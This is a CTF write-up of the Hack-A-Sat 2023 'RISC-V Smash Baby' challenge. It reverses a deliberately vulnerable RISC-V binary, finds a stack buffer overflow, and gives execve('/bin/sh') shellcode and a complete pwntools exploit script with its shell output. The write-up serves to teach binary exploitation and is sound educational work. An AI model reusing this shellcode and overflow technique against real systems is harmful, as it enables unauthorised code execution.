---
title: "RISC-V Smash Baby -- Hack-A-Sat Qualifier 2023"
excerpt_separator: "<!--more-->"
categories:
  - CTF Writeups
tags:
  - pwn
  - hack-a-sat
  - buffer overflow
  - binary exploitation
  - shellcode
  - risc-v
---

Hello fellow hackers! Today we're attempting to solve the [RISC-V Smash Baby](https://github.com/cromulencellc/hackasat-qualifier-2023/tree/main/challenges/3_Pure_Pwnage/0_RISC-V-Smash-Baby) challenge from the *Pure Pwnage* category of [Hack-A-Sat](https://hackasat.com/) Qualifier 2023 CTF. The program first leaks the memory address where the flag is stored on the main function stack and stores the flag to disk. A function vulnerable to buffer overflow can be reached by satisfying some value checks. Hence, the flag can be obtained by uploading shellcode that will print the string located at the leaked memory address, or by spawning a shell and printing the flag.

<!--more-->

![Hack-A-Sat 4 Banner](/assets/images/hackasat-4-banner.png)

## Introduction

In order to run the binary locally we first need to install a RISC-V emulator. The QEMU emulator can be installed on Kali Linux with the command below.

```terminal
$ apt install qemu-user
```

The repo containing the HackASat Qualifier 2023 challenges is cloned with the command below. The challenge file called `smash-baby`{: .filepath} is present in the challenge's `static`{: .filepath} directory.

```terminal
$ git clone https://github.com/cromulencellc/hackasat-qualifier-2023.git
$ cd hackasat-qualifier-2023/challenges/3_Pure_Pwnage/0_RISC-V-Smash-Baby/static
```

### Preliminary Static Analysis

The file type is examined using the `file` command. It is a non-stripped RISC-V 32-bit executable built for GNU/Linux.

```terminal
$ file smash-baby
smash-baby: ELF 32-bit LSB executable, UCB RISC-V, RVC, double-float ABI, version 1 (SYSV), statically linked, for GNU/Linux 5.4.0, with debug_info, not stripped
```

The security mechanisms are extracted with the `checksec` binary. Most security mechanisms seem to have been disabled.

```terminal
$ checksec smash-baby
[*] '/home/kali/ctf/has4/hackasat-qualifier-2023/challenges/3_Pure_Pwnage/0_RISC-V-Smash-Baby/static/smash-baby'
    Arch:     em_riscv-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x10000)
    RWX:      Has RWX segments
```

### Preliminary Dynamic Analysis

In order to run the challenge locally, the environment variable `FLAG` must be set. The file is marked as executable and run using the `qemu-riscv32` command.

```terminal
$ chmod +x smash-baby
$ FLAG=dummyflag qemu-riscv32 smash-baby

Baby's First RISC-V Stack Smash

Because I like you (and this is a baby's first type chall) here is something useful: 0x407ffe9c
Exploit me!
dfosuhfoismfosuhf
Time's up!
```

The program prints a memory address and asks for a string of characters from the user. It times out after a few seconds.

## Reversing

We then proceed to reverse engineer the binary to gain a deeper understanding of its inner workings. The binary is opened in Ghidra and analyzed with the default settings.

### The `main` function

The `main` function does the following:

- store the `FLAG` environment variable locally on the stack
- write the flag to the file `flag.txt`{: .filepath}
- clear the `FLAG` environment variable
- print out the address of the local variable storing the flag
- set up the timer
- enter the main loop
  - call the `synchronize` function, exit if unsuccessful
  - call the `read_message` function, exit if unsuccessful

### The `synchronize` function

The `synchronize` function implements a simple state machine by reading characters from stdin and checking their value until they meet a certain requirement, or until the limit imposed on the number of characters is reached. Looking at the decompilation, the string `ACEG` causes the function to return a value that will not trigger the main function to exit. The `read_message` function is then executed.

### The `read_message` function

The `read_message` function reads two characters from stdin:

- if `0xcefa` is read, the `do_face` function is called
- if `AA` is read, the `do_aa` function is called
- if `BB` is read, the `do_1b1` function is called
- else the program exits

### The `do_face`, `do_aa` and `do_1b1` functions

The three functions are very similar in terms of logic as they all read some data from stdin and store it in a stack buffer, and exit if the buffer is not filled entirely. However, a bug has been introduced in the `do_1b1` function, as it reads **60** bytes from stdin to a **20** bytes buffer. This means we can overflow the buffer to override the return address of the `do_1b1` function.

## Exploitation

There are many ways this challenged could be solved (see other writeups at the bottom of this page). For the sake of simplicity, we choose to upload a shellcode that spawns `/bin/sh` on the target system, and then `cat flag.txt` to obtain the flag. As the buffer of the `do_1b1` function is not large enough to contain our shellcode, we choose to upload the shellcode to the buffer of the `do_face` function and override the return address of the `do_1b1` function to point to the buffer of the `do_face` function.

### Crafting Shellcode

We start by crafting some RISC-V 32-bit shellcode that spawns `/bin/sh`. The assembly code is presented and analyzed below (credits: [Poland Can Into Space](https://github.com/cromulencellc/hackasat-qualifier-2023-techpapers/blob/main/4.%20Poland%20Can%20Into%20Space/4.%20Poland%20Can%20Into%20Space%20quals%20write-ups.pdf)).

```plaintext
  auipc a0, 0x0       # essentially a0 = 0 (set the upper bits of register `a0` to 0)
  addi a0, a0, 24     # set `a0` to point to the "/bin/sh" string in the data section
  addi a1, zero, 0    # set `a1` to zero
  addi a2, zero, 0    # set `a2` to zero
  addi a7, zero, 221  # set `a7` to 221 which corresponds to the `execve` syscal
  ecall               # perform syscall

.asciz "/bin/sh"      # declaration in the data section
```

### Finding the Shellcode Address

In order to trigger our shellcode, we need to override the return address of the `to_1b1` function with the address of the buffer of the `to_face` function, which implies we first need to find the address of the buffer. Recalling the result of the `checksec` script, Position-Independent Execution is not activated. This means the difference between the leaked address and the buffer address will be the same every time the binary is executed. Hence, if this difference is known, we just need to add it from the leaked address to obtain the address of the buffer at runtime.

This difference can be determined by looking at the function prologues of the `main`, `read_message` and `do_face` functions, more precisely at the instructions decrementing the stack pointer. We start counting from the base pointer of the main function until we reach the buffer of the `do_face` function:

- in `main`: `c.addi16sp sp, -0x40`, so we add `-0x40`
- in `main`, the leaked address is `0x24` bytes away from the base pointer, so we add `0x24`
- in `read_message`: `c.addi16sp sp, -0x30`, so we add `-0x30`
- in `do_face`: the buffer is `-0x140` bytes away from the base pointer, so we add `-0x140`

Adding everything up gives the difference in bytes between the leaked address and the address of our shellcode: `-0x40+0x24 - 0x30 - 0x140 = -0x18c`.

### Finding the Return Address Offset

The return address offset can be inferred from the structure of the stack of the `do_1b1` function. From Ghidra, the address of our shellcode must be padded with `0x24` bytes to be executed.

### Pwntools Exploit

We use the script below to automate the exploitation process.

```python
from pwn import *

context.arch = 'riscv'
context.log_level = 'info'

def generate_shellcode(flag_addr: int):
    asm_code = '''
        auipc a0, 0x0
        addi a0, a0, 24
        addi a1, zero, 0
        addi a2, zero, 0
        addi a7, zero, 221
        ecall

    .asciz "/bin/sh"
    '''
    return asm(asm_code, arch='riscv')

def main():
    # connect to challenge
    p = process(['qemu-riscv32', '-E', 'TIMEOUT=60', '-E', 'FLAG=dummyflag', './smash-baby'])
    #p = remote('localhost', 12345)

    # extract flag address
    p.recvuntil(b'here is something useful: ')
    flag_addr = int(p.recvline().strip(), 0)
    log.info('Flag address: %#x\n', flag_addr)
    p.recvuntil(b'Exploit me!\n')

    # shellcode
    shellcode = generate_shellcode(flag_addr)
    shellcode_offset = -0x40+0x24 - 0x30 - 0x140 # -396
    shellcode_addr = flag_addr + shellcode_offset
    payload = b''
    payload += b'ACEG'
    payload += p16(0xcefa)
    payload += shellcode
    payload += b'A' * (300-len(shellcode))

    # overflow
    overflow_offset = 0x24
    payload += b'ACEG'
    payload += p16(0x4242)
    payload += b'A' * overflow_offset
    payload += p32(shellcode_addr)

    p.send(payload)
    p.interactive()


if __name__ == "__main__":
    main()
```

Running the script gives the following output.

```terminal
$ python3 solve.py
[+] Starting local process '/usr/bin/qemu-riscv32': pid 14268
[*] Flag address: 0x407fff4c
[!] Could not find system include headers for riscv-linux
[*] Switching to interactive mode
$ ls
flag.txt  smash-baby  solve.py
$ cat flag.txt
dummyflag
```

Pwned!

I hope everything makes sense! If not feel free to open an issue in the GitHub repo or send me a text on Twitter/LinkedIn; I would be more than happy to try to answer it! If you liked this writeup feel free to give the GitHub repo a star, checkout my other Hack-A-Sat writeups and my other articles, and follow me on social medias.

Peace <3

## More writeups

- [Krautsat Writeup](https://github.com/cromulencellc/hackasat-qualifier-2023-techpapers/blob/51786c303ffda0463e5183c02b51afba2438f867/1.%20Krautsat/1.%20Krautsat%20has_technical_paper_quals.pdf)
- [Poland Can Into Space](https://github.com/cromulencellc/hackasat-qualifier-2023-techpapers/blob/main/4.%20Poland%20Can%20Into%20Space/4.%20Poland%20Can%20Into%20Space%20quals%20write-ups.pdf)
- [jmp fs_[rcx] Writeup](https://github.com/cromulencellc/hackasat-qualifier-2023-techpapers/blob/51786c303ffda0463e5183c02b51afba2438f867/5.%20jmp%20fs_%5Brcx%5D/Smash_Baby.pdf)
- [if this doesn't work we'll get more for next year Writeup](https://github.com/cromulencellc/hackasat-qualifier-2023-techpapers/blob/main/8.%20if%20this%20doesn't%20work%20we'll%20get%20more%20for%20next%20year/8.%20if-this-doesnt-work-hackasat-writeups.pdf)
